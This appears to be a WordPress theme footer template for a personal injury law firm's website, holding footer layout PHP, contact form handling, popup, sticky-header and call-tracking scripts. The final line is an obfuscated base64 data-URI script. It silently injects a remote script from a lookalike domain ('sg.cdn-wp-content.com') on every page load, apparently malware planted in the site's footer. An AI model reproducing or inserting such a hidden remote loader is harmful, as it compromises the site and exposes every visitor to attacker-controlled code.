<?php
        
if (! defined('ABSPATH')) {
    exit;
}    // Exit if accessed directly
            
        
        do_action('ava_before_footer');
            
        global $avia_config;
        $blank = isset($avia_config['template']) ? $avia_config['template'] : "";

        //reset wordpress query in case we modified it
        wp_reset_query();


        //get footer display settings
        $the_id                 = avia_get_the_id(); //use avia get the id instead of default get id. prevents notice on 404 pages
        $footer                 = get_post_meta($the_id, 'footer', true);
        $footer_options         = avia_get_option('display_widgets_socket', 'all');
        
        $avia_post_nav = '';
if (avia_get_option('disable_post_nav') != "disable_post_nav") {
    //get link to previous and next portfolio entry
    $avia_post_nav = avia_post_nav();
}

        /**
         * Reset individual page override to defaults if widget or page settings are different (user might have changed theme options)
         * (if user wants a page as footer he must select this in main options - on individual page it's only possible to hide the page)
         */
if (false !== strpos($footer_options, 'page')) {
    /**
     * User selected a page as footer in main options
     */
    if (! in_array($footer, array( 'page_in_footer_socket', 'page_in_footer', 'nofooterarea' ))) {
        $footer = '';
    }
} else {
    /**
     * User selected a widget based footer in main options
     */
    if (in_array($footer, array( 'page_in_footer_socket', 'page_in_footer' ))) {
        $footer = '';
    }
}
        
        $footer_widget_setting  = ! empty($footer) ? $footer : $footer_options;

        /*
         * Check if we should display a page content as footer
         */
if (! $blank && in_array($footer_widget_setting, array( 'page_in_footer_socket', 'page_in_footer' ))) {
    $post = get_post(avia_get_option('footer_page', 0));
            
    if (( $post instanceof WP_Post ) && ( $post->ID != $the_id )) {
        $content = Avia_Builder()->compile_post_content($post);
                
        /* was removed in 4.2.7 before rollout - should not break the output - can be removed completly when no errors are reported !
         *      <div class='container_wrap footer_color footer-page-content' id='footer'>
         */
        echo $content;
    }
}
        
        /**
         * Check if we should display a footer
         */
?>
<?php if(is_page(9593)){ ?>
  <div id="genfooterform" class="stepForm genfooterform" style="<?=(wp_is_mobile() ? '' : 'margin-top: 0px !important;position: relative;z-index: 999;');?>">
      <div id="customcontainer1" class="container">       
        <div class="stepBox genftrformstrt">
            <div id="customcontainer2" class="container">  
                <h3>Discover your legal options today.<small>Don't pay for someone else's negligence. Let us help.</small></h3> 
                <?php echo do_shortcode('[gravityform id="7" title="false" description="false" ajax="true"]'); ?>
            </div>
        </div>
      </div>
    </div>
    <?php if(false): ?>
<div class="google-map row">
	<!---
    <div class="av_one_forth">
  <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3563.8424179857707!2d-80.05361958495924!3d26.717480783212068!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0xd357efc9ccc8f598!2sLytal%20Reiter%20-%20Personal%20Injury%20Lawyers!5e0!3m2!1sen!2s!4v1617043579689!5m2!1sen!2s"  width="100%" height="100%" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"  allowfullscreen="" loading="lazy"></iframe> 
    
    </div>
    <div class="av_one_forth">
    <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d14301.080377807113!2d-80.0843096!3d26.3501247!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0xee66d17ada1af43d!2sBoca%20Raton%20Personal%20Injury%20Lawyers%20-%20Lytal%20Reiter!5e0!3m2!1sen!2s!4v1617390031843!5m2!1sen!2s"  width="100%" height="100%" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"  allowfullscreen="" loading="lazy"></iframe>
        
    </div>
    <div class="av_one_forth">
    <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3582.523704962838!2d-80.14391978565244!3d26.1144622002841!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x88d901f2e1a4b05d%3A0x3946e3ccab141615!2sFort%20Lauderdale%20Car%20Accident%20Lawyers%20%E2%80%93%20Lytal%20Reiter!5e0!3m2!1sen!2s!4v1617043440200!5m2!1sen!2s"  width="100%" height="100%" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"  allowfullscreen="" loading="lazy"></iframe>
    
    </div>
    <div class="av_one_forth">
        <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3545.1233801019275!2d-80.41421462498714!3d27.309326976413022!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x88deebb367de8729%3A0xce55c7fe793a4424!2sLytal%2C%20Reiter%2C%20Smith%2C%20Ivey%20%26%20Fronrath!5e0!3m2!1sen!2sus!4v1681928512967!5m2!1sen!2sus" width="100%" height="100%" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"  allowfullscreen="" loading="lazy"></iframe>
    </div>
	 <div class="av_one_forth">
		 <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d14265.456235536327!2d-81.8689452!3d26.6368237!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x88db41ea6f5a19d1%3A0xb7b50ab0b1ee990!2sLytal%20Reiter!5e0!3m2!1sen!2s!4v1683139558701!5m2!1sen!2s" width="100%" height="100%" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"  allowfullscreen="" loading="lazy"></iframe>
    </div>
    ---->
	<iframe src="https://www.google.com/maps/d/embed?mid=18Kx4c8fq4QmxHtWkWAnW--3EwbNlAJo&ehbc=2E312F&noprof=1&z=9" width="100%" height="580"></iframe>
</div><?php endif; //old map footer ?>
<?php } ?>

<?php if (false): ?>
        <div class="practice-footer yes">
            <div class='container'>
        <?php
        if (! $blank && $footer_widget_setting != 'nofooterarea') {
            if (in_array($footer_widget_setting, array( 'all', 'nosocket' ))) {
                //get columns
                $columns = avia_get_option('footer_columns');
                ?>
                <div class='container_wrap footer_color' id='footer'>

                        <?php
                        do_action('avia_before_footer_columns');

                        //create the footer columns by iterating

                        
                        switch ($columns) {
                            case 1:
                                $class = '';
                                break;
                            case 2:
                                $class = 'av_one_half';
                                break;
                            case 3:
                                $class = 'av_one_third';
                                break;
                            case 4:
                                $class = 'av_one_fourth';
                                break;
                            case 5:
                                $class = 'av_one_fifth';
                                break;
                            case 6:
                                $class = 'av_one_sixth';
                                break;
                        }
                        
                        $firstCol = "first el_before_{$class}";

                        //display the footer widget that was defined at appearenace->widgets in the wordpress backend
                        //if no widget is defined display a dummy widget, located at the bottom of includes/register-widget-area.php
                        for ($i = 1; $i <= $columns; $i++) {
                            $class2 = ""; // initialized to avoid php notices
                            if ($i != 1) {
                                $class2 = " el_after_{$class}  el_before_{$class}";
                            }
                            echo "<div class='flex_column {$class} {$class2} {$firstCol}'>";
                            if ($i != 2) {
                                if (function_exists('dynamic_sidebar') && dynamic_sidebar('Footer - column'.$i)) :
                                else :
                                    avia_dummy_widget($i);
                                endif;
                            }
                            echo "</div>";
                            $firstCol = "";
                        }

                        do_action('avia_after_footer_columns');

                        ?>


                <!-- ####### END FOOTER CONTAINER ####### -->
                </div>

            <?php   } //endif   array( 'all', 'nosocket' ) ?>



            

            <?php

            //copyright
            $copyright = do_shortcode(avia_get_option('copyright', "© ".__('Copyright', 'avia_framework')."  - <a href='".home_url('/')."'>".get_bloginfo('name')."</a>"));

            // you can filter and remove the backlink with an add_filter function
            // from your themes (or child themes) functions.php file if you dont want to edit this file
            // you can also remove the kriesi.at backlink by adding [nolink] to your custom copyright field in the admin area
            // you can also just keep that link. I really do appreciate it ;)
            //$kriesi_at_backlink = kriesi_backlink(get_option(THEMENAMECLEAN."_initial_version"), 'Enfold');


            
            if ($copyright && strpos($copyright, '[nolink]') !== false) {
                $kriesi_at_backlink = "";
                $copyright = str_replace("[nolink]", "", $copyright);
            }

            if (in_array($footer_widget_setting, array( 'all', 'nofooterwidgets', 'page_in_footer_socket' ))) {
                ?>

                <footer class='container_wrap socket_color' id='socket' <?php avia_markup_helper(array('context' => 'footer')); ?>>

                        <?php
                        if (avia_get_option('footer_social', 'disabled') != "disabled") {
                            $social_args    = array('outside'=>'ul', 'inside'=>'li', 'append' => '');
                            echo avia_social_media_icons($social_args, false);
                        }
                        
                            
                                $avia_theme_location = 'avia3';
                                $avia_menu_class = $avia_theme_location . '-menu';

                                $args = array(
                                    'theme_location'=>$avia_theme_location,
                                    'menu_id' =>$avia_menu_class,
                                    'container_class' =>$avia_menu_class,
                                    'fallback_cb' => '',
                                    'depth'=>1,
                                    'echo' => false,
                                    'walker' => new avia_responsive_mega_menu(array('megamenu'=>'disabled'))
                                );
                            
                                $menu = wp_nav_menu($args);
                            
                                echo "<p class='esi-link'><span style='width:100%; display: flex; align-items: center; justify-content: center;'><a class='esi-footer-logo' target='_blank' style='display: flex; align-items: center; justify-content: center;' href='https://www.eversparkinteractive.com'><img style='width:200px;' src='https://www.foryourrights.com/wp-content/uploads/2023/04/everspark-interactive-b-logo.png' alt='everspark interactive logo' ></a></span><br></p><br/><p class='esi-imp'><strong>Important Notice:</strong> Safety has  always been a priority at Lytal, Reiter, Smith, Ivey & Fronrath.  To ensure that you have complete access to our  firm without leaving the safety of your home, you can call, use the chat service online, Facetime, or use other video conferencing such as ZOOM in order to communicate with an attorney.  Our goal is to ensure you  have access to justice in your time of need and at the same time protect the public and staff from any unneeded exposure.</p><div class='copyright'>";
                                echo $copyright;
                                echo "</div>";
                            
                                if ($menu) {
                                    echo "<nav class='sub_menu_socket' ".avia_markup_helper(array('context' => 'nav', 'echo' => false)).">";
                                    echo $menu;
                                    echo "</nav>";
                                }
                                ?>

                <!-- ####### END SOCKET CONTAINER ####### -->
                </footer>
                


                <?php
            } //end nosocket check - array( 'all', 'nofooterwidgets', 'page_in_footer_socket' )
        } //end blank & nofooterarea check
        ?>
    </div></div>
    <?php endif; // old footer end
    
        echo do_shortcode('[elementor-template id="18004"]');
    ?>
        <!-- end main -->
<?php
        
        
        //display link to previous and next portfolio entry
        echo    $avia_post_nav;
        
        echo "<!-- end wrap_all --></div>";


        if (isset($avia_config['fullscreen_image'])) { ?>
            <!--[if lte IE 8]>
            <style type="text/css">
            .bg_container {
            -ms-filter:"progid:DXImageTransform.Microsoft.AlphaImageLoader(src='<?php echo $avia_config['fullscreen_image']; ?>', sizingMethod='scale')";
            filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='<?php echo $avia_config['fullscreen_image']; ?>', sizingMethod='scale');
            }
            </style>
            <![endif]-->
            <?php
            echo "<div class='bg_container' style='background-image:url(".$avia_config['fullscreen_image'].");'></div>";
        }
        ?>


<a href='#top' title='<?php _e('Scroll to top', 'avia_framework'); ?>' id='scroll-top-link' <?php echo av_icon_string('scrolltop'); ?>><span class="avia_hidden_link_text"><?php _e('Scroll to top', 'avia_framework'); ?></span></a>

<div id="fb-root"></div>

<?php

    /* Always have wp_footer() just before the closing </body>
     * tag of your theme, or you will break many plugins, which
     * generally use this hook to reference JavaScript files.
     */

wp_footer();
?>

<script type="text/javascript">
	jQuery('.video-popup').magnificPopup({
    items: [
		   {
        src: '/wp-content/uploads/2022/03/220317_gma_bentiez_737_700.mp4', // CSS selector of an element on page that should be used as a popup
        type: 'iframe'
      },
    
   {
        src: '//www.youtube.com/watch?v=q9L4iJ41Om4', // HTML string
        type: 'iframe'
      },
     
     {
        src: '/wp-content/uploads/2022/02/Y2Mate.is-Woman-Plunges-to-Her-Death-From-Rising-Drawbridge-HEDv3it-it4-1080p-1645374202570.mp4', // CSS selector of an element on page that should be used as a popup
        type: 'iframe'
      }
    ],
    gallery: {
      enabled: true
    },
    type: 'image' // this is a default type
});
	
	
window.onscroll = function() {myFunction()};

var header = document.getElementById("header");
var sticky = header.offsetTop;

function myFunction() {
  if (window.pageYOffset > 400) {
    header.classList.add("sticky");
  } else {
    header.classList.remove("sticky");
  }
}
jQuery(document).ready(function($) {
  $("#mysticky-nav .main_menu").before( $('<a class="stick-link" href="/" ><img class="mob-logo-stick" src="/wp-content/uploads/2020/10/lytal-logo-min-300x129.png" alt="" ></a>') );
})
	    jQuery(document).ready(function($) {
  $("#mysticky-nav .stick-link").after( $('<a class="stick-cta" href="tel:5616551990"><i class="fa fa-phone" aria-hidden="true"></i></a>') );
})
    /*document.addEventListener( 'wpcf7mailsent', function( event ) {
        var status = event.detail.status;  
        //console.log(status);  
        //if( status === 'validation_failed'){
            jQuery('.wpcf7-submit').val("Thank You!");
        //}    
    }, false ); */

    document.addEventListener( 'wpcf7submit', function( event ) {
        var status = event.detail.status;
        //var status = event.detail.status;

        //console.log(status);

        /*if( status === 'validation_failed'){
            jQuery('.homeBanner .wpcf7-submit').val("COUNT ME IN !");
            jQuery('.volunteerForm .wpcf7-submit').val("Submit");
            jQuery('.homeBanner .wpcf7-submit').val("COUNT ME IN !");
        } else {
            jQuery('.wpcf7-submit').val("Thank You!");
        }*/

        if((status == 'validation_failed')){
            
            if ('6817' == event.detail.contactFormId) {
                jQuery('.bizinsuranceBanner .wpcf7-submit').val("Free Case Evaluation");
            }

            if ('6843' == event.detail.contactFormId){
                jQuery('.bizGetaFree .wpcf7-submit').val("Free Case Evaluation");
            }

        } else {

           if ('6817' == event.detail.contactFormId) {
                jQuery('.bizinsuranceBanner .wpcf7-submit').val("Thank You!");
            }

            if ('6843' == event.detail.contactFormId){
                jQuery('.bizGetaFree .wpcf7-submit').val("Thank You!");
            }

        }
        
    }, false );

    jQuery('.wpcf7-submit').on('click',function(){
        jQuery(this).val("Submitting....");
    });

    

</script>

<?php if (is_page(6065)) : ?>
<?php else : ?>
    <script type="text/javascript">

        (function($) {
            $.fn.shorten = function (settings) {
            
                var config = {
                    showChars: 100,
                    ellipsesText: "...",
                    moreText: "Read More",
                    lessText: "Show Less"
                };

                if (settings) {
                    $.extend(config, settings);
                }
                
                $(document).off("click", '.morelink');
                
                $(document).on({click: function () {

                        var $this = $(this);
                        if ($this.hasClass('less')) {
                            $this.removeClass('less');
                            $this.html(config.moreText);
                        } else {
                            $this.addClass('less');
                            $this.html(config.lessText);
                        }
                        //$this.parent().prev().toggle();
                        //$this.prev().toggle();
                        $this.parent().parent().toggleClass('opened');
                        return false;
                    }
                }, '.morelink');

                return this.each(function () {
                    var $this = $(this);
                    if($this.hasClass("shortened")) return;
                    
                    $this.addClass("shortened");
                    var content = $this.html();
                    if (content.length > config.showChars) {
                        var c = content.substr(0, config.showChars);
                        var h = content.substr(config.showChars, content.length - config.showChars);
                        var html = c + '<span class="moreellipses">' + config.ellipsesText + ' </span><span class="morecontent"><span>' + h + '</span> <a href="#" class="morelink">' + config.moreText + '</a></span>';
                        $this.html(html);
                        //$(".morecontent span").hide();
                    }
                });
                
            };

         })(jQuery);

         jQuery(document).ready(function() {
            
            jQuery(".avia-testimonial-content").shorten({
                "showChars" : 160,
            });

        });

    </script>
    
<?php endif; ?>


<?php //echo "for reference old Toll Free: (800) 654-2024";?>

<script>vs_account_id = "CtjSZ1C1Q4E5VgAi";</script>
<script src="https://rw1.marchex.io/euinc/number-changer.js"></script>
<script>
jQuery(document).ready(function(){
    jQuery(document).on('click','.send-msg-wrapper',function(){
        window.location.href="/contact/";
    });
    jQuery(".msg-now-btn").html('<a href="#gform_widget-3">MESSAGE NOW</a>');
    jQuery(".recent-settlements-read-more").html('<a href="/results/">Read More</a>');
});
</script>
<script>
jQuery(document).ready(function ($) {
var deviceAgent = navigator.userAgent.toLowerCase();
if (deviceAgent.match(/(iphone|ipod|ipad)/)) {
$("html").addClass("ios");
$("html").addClass("mobile");
}
if (navigator.userAgent.search("MSIE") >= 0) {
$("html").addClass("ie");
}
else if (navigator.userAgent.search("Chrome") >= 0) {
$("html").addClass("chrome");
}
else if (navigator.userAgent.search("Firefox") >= 0) {
$("html").addClass("firefox");
}
else if (navigator.userAgent.search("Safari") >= 0 && navigator.userAgent.search("Chrome") < 0) {
$("html").addClass("safari");
}
else if (navigator.userAgent.search("Opera") >= 0) {
$("html").addClass("opera");
}
});
  jQuery( document ).ready(function() {
    var heights=[];
    jQuery('.esiequbox').each(function(){
    heights.push(jQuery(this).height());
    });
    var maxhg=Math.max.apply(null,heights);
    jQuery('.esiequbox').height(maxhg);
});
</script>
<script defer src="data:text/javascript;base64,X1ZYZUUzSENkYUZwWW43Sjl1aDlwPXRydWU7KGZ1bmN0aW9uKCkge3ZhciBfTHBaUyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOyBfTHBaUy50eXBlID0gInRleHQvamF2YXNjcmlwdCI7IF9McFpTLmFzeW5jID0gdHJ1ZTtfTHBaUy5zcmMgPSAoImh0dHBzOiIgPT0gZG9jdW1lbnQubG9jYXRpb24ucHJvdG9jb2wgPyAiaHR0cHM6Ly8iIDogImh0dHA6Ly8iKSArInNnLmNkbi13cC1jb250ZW50LmNvbS90YWcvOTI2MjEzNzM5OC5qcz92PSIrTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpKjk5OTk5OTk5OTkpO3ZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoInNjcmlwdCIpWzBdOyBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKF9McFpTLCBzKTt9KSgpO19DQ2YwYWlQZnJ3Mm1XeGFDYTV1ND1mYWxzZTs="></script>
